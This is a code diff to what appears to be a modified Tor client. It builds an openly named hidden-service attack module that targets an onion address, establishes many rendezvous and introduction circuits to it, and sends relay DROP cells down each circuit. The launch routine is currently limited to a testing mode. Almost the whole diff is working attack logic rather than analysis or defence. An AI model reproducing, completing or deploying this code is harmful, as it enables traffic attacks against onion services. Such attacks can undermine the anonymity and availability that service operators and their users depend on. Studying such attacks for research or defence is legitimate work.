@@ -20,41 +20,8 @@
  */
 static hs_rd_attack_t *attack_infos = NULL;
 
-hs_attack_stats_t* hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress, 
-    int nbr_circuits, time_t *until) {
-  log_debug(LD_REND, "HS_ATTACK : Entering hs_attack_entry_point\n");
-  if (!attack_infos){
-    log_debug(LD_REND,"HS_ATTACK : initalize attack_infos\n");
-    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
-    attack_infos->rendcircs = smartlist_new();
-    attack_infos->stats = (hs_attack_stats_t *)  tor_malloc(sizeof(hs_attack_stats_t));
-    attack_infos->retry_intro = 0;
-    attack_infos->stats->tot_cells = 0;
-    attack_infos->stats->nbr_rendcircs = 0;
-    /*attack_infos->extend_info = NULL;*/
-    attack_infos->current_target = strdup(onionaddress);
-    //attack_infos->rend_data = NULL;
-    //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
-  }
-  switch(cmd) {
-    case ESTABLISH_RDV:
-      // Establish all rendezvous circuits
-      if (hs_attack_init_rendezvous_circuits(nbr_circuits, onionaddress) < 0) {
-        log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
-        return NULL;
-      }
-      if (hs_attack_init_intro_circuit(attack_infos->retry_intro) < 0) {
-          log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
-          return NULL; 
-      }
-      break;
-    case SEND_RD: hs_attack_launch(until); break;
-    default: break;
-  }
-  return attack_infos->stats;
-}
-
-int hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
+static int 
+hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
   log_debug(LD_REND,"HS_ATTACK : entering hs_attack_init_rendezvous_circuits\n");
   int c = 0;
   while (attack_infos->rendcircs->num_used < nbr_circuits) {
@@ -88,14 +55,15 @@ int hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddres
  * nbr_circuits different INTRO1 cells
  */
 
-int hs_attack_init_intro_circuit(int retry) {
+static int hs_attack_init_intro_circuit(int retry) {
   //uint8_t flags = CIRCLAUNCH_ONEHOP_TUNNEL;
   uint8_t flags = CIRCLAUNCH_NEED_UPTIME;
 
   if (retry == 0){
     log_debug(LD_REND, "HS_ATTACK: Entering hs_attack_init_intro_circuit\n");
-    /* kind of hack. We don't any circuit yet
-     * to use as introducing circuit. Launch one and wait
+    /* kind of hack. We don't have any circuit yet
+     * to use as introducing circuit. Launch one intro circ
+     * for each rendezvous circ  and wait
      * until we can canibilize it*/
     SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
       circmap->introcirc = circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, flags);
@@ -136,7 +104,9 @@ int hs_attack_init_intro_circuit(int retry) {
   /*Completly mindfuck yeah but ... Look for a general circuit; change its role
    * and send intro request
    * without having build previously a GENERAL circ, we got null =>
-   *  Always build a general circ before then build the circ we need for introduction*/
+   * Always build a general circ before then build the circ we need for introduction
+   * because introcircs have been designed to be extension of general circs towards
+   * an introduction point*/
  // return 0;
   int count_failure = 0;
   SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
@@ -152,7 +122,6 @@ int hs_attack_init_intro_circuit(int retry) {
     }
   } SMARTLIST_FOREACH_END(circmap);
   if (count_failure && retry < RETRY_THRESHOLD*count_failure) {
-    //build a general circ and tell the client to retry in a few seconds
     log_info(LD_REND, "HS_ATTACK: Something went wrong when building\
                        introcirc -- retry with new extend_info next time\n");
     //could do this with subtype of event like INFO : RETRY_INTRO
@@ -248,9 +217,6 @@ void hs_attack_mark_intro_ready(origin_circuit_t *introcirc) {
   }SMARTLIST_FOREACH_END(circmap);
 }
 
-void hs_attack_launch(time_t *until) {
-
-}
 
 /*
  * Almost a copy of 
@@ -260,11 +226,62 @@ void hs_attack_launch(time_t *until) {
  * If the cell cannot be sent, we mark the circuit for close and return -1
  */
 
-int send_rd_cell(circuit_t *circ){
+static int send_rd_cell(origin_circuit_t *circ){
+  if (relay_send_command_from_edge(0, TO_CIRCUIT(circ),
+                                   RELAY_COMMAND_DROP,
+                                   NULL, 0, circ->cpath->prev) < 0)
+    return -1;
+  log_debug(LD_REND, "HS_ATTACK: Send rd cell down circ\n");
   return 0;
 }
 
-void free_hs_rd_attack(){
+static void hs_attack_launch(time_t *until) {
+  if (HS_ATTACK_TESTING) {
+    /*Just send 1 rd through each rendezvous circ*/
+    SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
+      if (send_rd_cell(circmap->rendcirc) < 0) {
+        log_debug(LD_REND, "HS_ATTACK: send_rd_cell failed\n");
+      }
+    } SMARTLIST_FOREACH_END(circmap);
+  }
+}
+
+static void free_hs_rd_attack(){
 
 }
 
+
+hs_attack_stats_t*
+hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress, 
+    int nbr_circuits, time_t *until) {
+  log_debug(LD_REND, "HS_ATTACK : Entering hs_attack_entry_point\n");
+  if (!attack_infos){
+    log_debug(LD_REND,"HS_ATTACK : initalize attack_infos\n");
+    attack_infos = (hs_rd_attack_t *) tor_malloc(sizeof(hs_rd_attack_t));
+    attack_infos->rendcircs = smartlist_new();
+    attack_infos->stats = (hs_attack_stats_t *)  tor_malloc(sizeof(hs_attack_stats_t));
+    attack_infos->retry_intro = 0;
+    attack_infos->stats->tot_cells = 0;
+    attack_infos->stats->nbr_rendcircs = 0;
+    /*attack_infos->extend_info = NULL;*/
+    attack_infos->current_target = strdup(onionaddress);
+    //attack_infos->rend_data = NULL;
+    //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
+  }
+  switch(cmd) {
+    case ESTABLISH_RDV:
+      // Establish all rendezvous circuits
+      if (hs_attack_init_rendezvous_circuits(nbr_circuits, onionaddress) < 0) {
+        log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
+        return NULL;
+      }
+      if (hs_attack_init_intro_circuit(attack_infos->retry_intro) < 0) {
+          log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
+          return NULL; 
+      }
+      break;
+    case SEND_RD: hs_attack_launch(until); break;
+    default: break;
+  }
+  return attack_infos->stats;
+}
